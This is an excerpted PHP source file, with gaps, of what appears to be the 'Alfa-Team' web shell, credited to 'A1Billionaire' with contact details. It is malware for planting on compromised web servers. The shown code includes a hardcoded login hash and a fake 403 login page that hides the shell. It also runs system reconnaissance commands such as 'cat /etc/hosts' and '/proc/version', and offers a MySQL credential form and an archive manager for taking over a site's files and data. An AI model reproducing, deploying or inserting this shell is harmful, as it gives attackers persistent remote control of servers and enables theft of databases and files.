<?php
/*
	Author: 	A1Billionaire/Alfa-Team
	Telegram: 	https://telegram.me/A1Billionaire
	YouTube: 	https://youtube.com/A1Billionaire
	Gmail:		pgsddusunjogja@gmail.com
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'A1Billionaire',
    'password' => 'd533c7e24a683e47a1c10f11d6e8ecd9',//md5(A1Billionaire)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@alfaGetCwd());if($GLOBALS['glob_chdir_false']){
...
<font color='#00A220'>Contact : pgsddusunjogja@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @A1Billionaire</font><br>
...
$email = "pgsddusunjogja@gmail.com";
...
<div id='rightclick_menu'>
  ...
  <a href='javascript:void(0);' onclick='alfaPopupAction(this, \"move\");' ftype='' path='' fname=''href='' href='' name='move'><imgsrc=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
...
"Hosts" =>"cat /etc/hosts",
"Cpuinfo"=>"cat /proc/cpuinfo","Version"=>"cat /proc/version","Sbin"=>"ls -al /usr/sbin",
...
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'id'=>'db_host','inputName' => 'localhost', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'id'=>'db_name','inputName' => 'database', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
...
function alfaarchive_manager(){
	...
	if($_POST['alfa5']=='>>'){
		...
		__alfa_open_archive_file($file, $rand_id);echo '</div>';
	}
	echo '</div>';
	alfafooter();
}
